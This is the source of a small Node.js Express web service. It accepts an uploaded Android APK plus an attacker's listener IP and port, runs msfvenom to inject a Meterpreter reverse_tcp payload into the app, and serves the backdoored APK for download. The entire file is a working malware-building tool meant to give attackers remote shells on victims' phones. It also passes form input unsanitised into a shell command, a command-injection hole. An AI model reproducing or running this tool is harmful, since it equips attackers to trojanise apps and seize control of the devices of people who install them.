//jshint esversion:6

const express = require("express")
const upload = require('express-fileupload')
const app = express();
const fs = require('fs');

var bodyParser  = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"))

const util = require('util');
const exec = util.promisify(require('child_process').exec);

app.use(upload())

var lhostip=""
var lportno=""
//var command = 'msfvenom -x ./uploads/file.apk -p android/meterpreter/reverse_tcp lhost=${lhostip} lport=${lportno} -o ./uploads/filevirus.apk';
async function msf_backdoor() {
  const { stdout, stderr } = await exec('msfvenom -x ./uploads/file.apk -p android/meterpreter/reverse_tcp lhost='+lhostip+' lport='+lportno+' -o ./uploads/file_backdoored.apk');
  console.log('stdout:', stdout);
  console.log('stderr:', stderr);
}

app.get('/download', function(req, res){
const file = (__dirname + '/uploads/file_backdoored.apk');
res.download(file); // Set disposition and send it.
});

app.get("/", function(req,res){
  res.sendFile(__dirname + '/index.html')
})

app.post('/formvalues', function(req, res){
    lhostip = req.body.lhostip;
    lportno = req.body.lportno;
    console.log(lhostip);
    console.log(lportno);
    var cmd = 'msfvenom -x ./uploads/file.apk -p android/meterpreter/reverse_tcp lhost='+lhostip+' lport='+lportno+' -o ./uploads/file_backdoored.apk'
    console.log(cmd);
});

app.post("/uploadfile", function(req,res){
  if (req.files) {
    console.log(req.files)
    var file = req.files.file //input type="file" name="file"
    var filename = file.name
    console.log(filename);

    file.mv('./uploads/file.apk', function (err) {
      if(err){
        res.send(err)
      } else {
        msf_backdoor();
        res.send("File uploaded. Please wait upto 2 mins for msf to backdoor and visit /download for the file.")
      }
    })
}
})

app.listen(3000, function(){
  console.log("server started on port 3000");
});
